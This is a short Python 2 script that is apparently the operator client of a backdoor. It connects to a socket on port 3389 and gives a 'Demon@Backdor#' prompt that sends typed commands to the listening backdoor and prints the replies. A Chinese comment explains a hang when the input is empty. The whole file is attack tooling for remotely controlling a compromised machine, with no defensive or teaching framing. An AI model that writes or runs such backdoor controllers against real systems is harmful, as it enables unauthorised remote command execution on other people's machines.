#coding: utf-8
import socket

c = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
c.connect(("127.0.0.1", 3389));

try:
    while 1:
        data = raw_input("Demon@Backdor# ");
        #如果内容为空，使用send sendall方法会卡住
        if not data:
            continue;
        c.send(data);
        if data.strip("\n") == "exit":
            break;
        res = c.recv(1024);
        print res;

    c.close();
except KeyboardInterrupt:
    pass
